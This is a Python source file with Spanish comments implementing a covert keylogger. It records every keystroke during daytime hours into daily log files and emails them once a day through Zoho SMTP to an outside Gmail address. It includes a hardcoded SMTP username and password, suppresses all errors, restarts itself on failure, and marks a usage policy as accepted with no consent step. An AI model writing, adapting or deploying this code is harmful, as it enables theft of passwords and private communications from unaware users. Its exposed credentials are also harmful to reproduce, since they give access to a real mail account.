import os
import sys
import json
import smtplib
import ssl
from datetime import datetime, time
from email.message import EmailMessage
from pynput import keyboard
import socket
import threading
import time as time_module

# ---------- Configuración ----------
if getattr(sys, 'frozen', False):
    APP_DIR = os.path.dirname(sys.executable)
else:
    APP_DIR = os.path.dirname(os.path.abspath(__file__))

LOGS_DIR = os.path.join(APP_DIR, "logs")
CONFIG_FILE = os.path.join(APP_DIR, "config.dat")
START = time(hour=6, minute=0)
END = time(hour=20, minute=0)
HORA_ENVIO = time(hour=15, minute=0)  # 3 PM

# Configuración SMTP
SMTP_HOST = os.environ.get("SMTP_HOST", "smtp.zoho.com")
SMTP_PORT = int(os.environ.get("SMTP_PORT", 465))
SMTP_USER = os.environ.get("SMTP_USER", "onecore_mail@zohomail.com")
SMTP_PASS = os.environ.get("SMTP_PASS", "Onecore2025**")
MAIL_TO = os.environ.get("MAIL_TO", "yarokasas@gmail.com")

# ---------- Variables globales ----------
nombre_equipo = ""
envio_realizado_hoy = False
keyboard_listener = None

# ---------- Funciones de Configuración ----------
def obtener_nombre_equipo():
    """Obtiene el nombre del equipo automáticamente."""
    try:
        return socket.gethostname()
    except:
        return "EQUIPO_DESCONOCIDO"

def cargar_config():
    """Carga la configuración guardada."""
    global nombre_equipo
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                config = json.load(f)
                nombre_equipo = config.get("nombre_equipo", "")
                return True
        except:
            return False
    return False

def guardar_config():
    """Guarda la configuración."""
    config = {
        "nombre_equipo": nombre_equipo,
        "fecha_instalacion": datetime.now().isoformat(),
        "politica_aceptada": True
    }
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(config, f, indent=2)
    except:
        pass

def inicializar_config():
    """Inicializa la configuración al primer uso."""
    global nombre_equipo
    if not cargar_config():
        nombre_equipo = obtener_nombre_equipo()
        guardar_config()

# ---------- Funciones de Log ----------
def obtener_log_del_dia():
    """Obtiene la ruta del archivo de log del día actual."""
    fecha = datetime.now().strftime('%Y-%m-%d')
    if not os.path.exists(LOGS_DIR):
        os.makedirs(LOGS_DIR)
    return os.path.join(LOGS_DIR, f"log_{fecha}.dat")

def dentro_de_horario():
    """Verifica si estamos dentro del horario de captura."""
    ahora = datetime.now().time()
    return START <= ahora <= END

def asegurar_log_existe():
    """Asegura que el archivo de log del día existe."""
    log_file = obtener_log_del_dia()
    if not os.path.exists(log_file):
        try:
            with open(log_file, "w", encoding="utf-8") as f:
                f.write(f"=== Equipo: {nombre_equipo} ===\n")
                f.write(f"=== Fecha: {datetime.now().strftime('%Y-%m-%d')} ===\n")
                f.write(f"=== Inicio: {datetime.now().isoformat()} ===\n\n")
        except:
            pass

def log_key(text):
    """Añade una entrada al archivo de log del día."""
    if not dentro_de_horario():
        return False
    
    try:
        log_file = obtener_log_del_dia()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        linea = f"[{timestamp}] {text}\n"
        
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(linea)
        return True
    except:
        return False

def on_press(key):
    """Callback para cuando se presiona una tecla."""
    try:
        if hasattr(key, 'char') and key.char:
            log_key(key.char)
        else:
            key_name = str(key).replace("Key.", "")
            log_key(f"[{key_name}]")
    except:
        pass

# ---------- Funciones de Envío ----------
def enviar_mail_con_adjuntos(subject: str, body: str, attachments: list) -> tuple:
    """Envía un email con archivos adjuntos."""
    if not SMTP_USER or not SMTP_PASS or not MAIL_TO:
        return False, "Credenciales SMTP incompletas."

    try:
        msg = EmailMessage()
        msg["From"] = SMTP_USER
        msg["To"] = MAIL_TO
        msg["Subject"] = subject
        msg.set_content(body)

        for path in attachments:
            try:
                if os.path.exists(path):
                    with open(path, "rb") as f:
                        data = f.read()
                    filename = os.path.basename(path)
                    msg.add_attachment(data, maintype="application", 
                                     subtype="octet-stream", filename=filename)
            except Exception as e:
                return False, f"Error adjuntando: {e}"

        if SMTP_PORT == 465:
            context = ssl.create_default_context()
            with smtplib.SMTP_SSL(SMTP_HOST, SMTP_PORT, context=context) as server:
                server.login(SMTP_USER, SMTP_PASS)
                server.send_message(msg)
        else:
            with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
                server.starttls(context=ssl.create_default_context())
                server.login(SMTP_USER, SMTP_PASS)
                server.send_message(msg)
        return True, "Enviado"
    except Exception as e:
        return False, str(e)

def enviar_log_programado():
    """Envía el log del día automáticamente."""
    try:
        log_file = obtener_log_del_dia()
        
        # Verificar que existe y tiene contenido
        if not os.path.exists(log_file):
            return False, "Log no existe"
        
        size = os.path.getsize(log_file)
        if size < 100:
            return False, "Log vacío"
        
        fecha = datetime.now().strftime('%Y-%m-%d')
        subject = f"[Keylog] {nombre_equipo} - {fecha}"
        body = f"Registro diario del equipo: {nombre_equipo}\n"
        body += f"Fecha: {fecha}\n"
        body += f"Horario: {START.strftime('%H:%M')} - {END.strftime('%H:%M')}\n"
        body += f"Tamaño: {size} bytes"
        
        success, msg = enviar_mail_con_adjuntos(subject, body, [log_file])
        return success, msg
    except Exception as e:
        return False, str(e)

def limpiar_logs_antiguos():
    """Elimina logs de más de 7 días."""
    try:
        if not os.path.exists(LOGS_DIR):
            return
        
        ahora = datetime.now()
        for filename in os.listdir(LOGS_DIR):
            if filename.startswith("log_") and filename.endswith(".dat"):
                filepath = os.path.join(LOGS_DIR, filename)
                # Obtener fecha del archivo
                fecha_str = filename.replace("log_", "").replace(".dat", "")
                try:
                    fecha_archivo = datetime.strptime(fecha_str, '%Y-%m-%d')
                    dias_diff = (ahora - fecha_archivo).days
                    if dias_diff > 7:
                        os.remove(filepath)
                except:
                    pass
    except:
        pass

def verificar_hora_envio():
    """Verifica continuamente si es hora de enviar."""
    global envio_realizado_hoy
    
    while True:
        try:
            ahora = datetime.now()
            hora_actual = ahora.time()
            
            # Resetear flag si es un nuevo día (a las 00:01)
            if ahora.hour == 0 and ahora.minute == 1:
                envio_realizado_hoy = False
                limpiar_logs_antiguos()
            
            # Verificar si es la hora de envío (con margen de 1 minuto)
            minuto_envio = HORA_ENVIO.hour * 60 + HORA_ENVIO.minute
            minuto_actual = hora_actual.hour * 60 + hora_actual.minute
            
            if (minuto_actual == minuto_envio and not envio_realizado_hoy):
                success, msg = enviar_log_programado()
                if success:
                    envio_realizado_hoy = True
                    # Registrar envío exitoso
                    log_key(f"[SISTEMA: Correo enviado a las {ahora.strftime('%H:%M')}]")
            
            # Esperar 60 segundos
            time_module.sleep(60)
        except Exception as e:
            time_module.sleep(60)

# ---------- Inicio del Servicio ----------
def iniciar_servicio():
    """Inicia el servicio de captura en segundo plano."""
    global keyboard_listener
    
    try:
        # Inicializar configuración
        inicializar_config()
        asegurar_log_existe()
        
        # Iniciar listener de teclado
        keyboard_listener = keyboard.Listener(on_press=on_press)
        keyboard_listener.start()
        
        # Iniciar verificación de envío en hilo separado
        thread_envio = threading.Thread(target=verificar_hora_envio, daemon=True)
        thread_envio.start()
        
        # Mantener el programa corriendo
        keyboard_listener.join()
        
    except Exception as e:
        # Si hay error, intentar nuevamente después de 30 segundos
        time_module.sleep(30)
        iniciar_servicio()

if __name__ == "__main__":
    iniciar_servicio()